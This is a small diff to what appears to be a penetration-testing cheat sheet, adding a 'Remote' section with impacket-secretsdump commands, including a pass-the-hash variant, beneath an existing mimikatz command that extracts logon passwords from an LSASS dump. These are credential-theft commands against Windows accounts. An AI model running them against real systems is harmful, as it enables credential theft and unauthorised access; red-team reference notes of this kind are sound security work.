@@ -223,6 +223,10 @@ If disabled:
 
 `C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`
 
+### Remote
+
+`impacket-secretsdump Administrator@ip`
+`impacket-secretsdump Administrator@ip -hashes ntlm:hash`
 
 ### Domain 
 
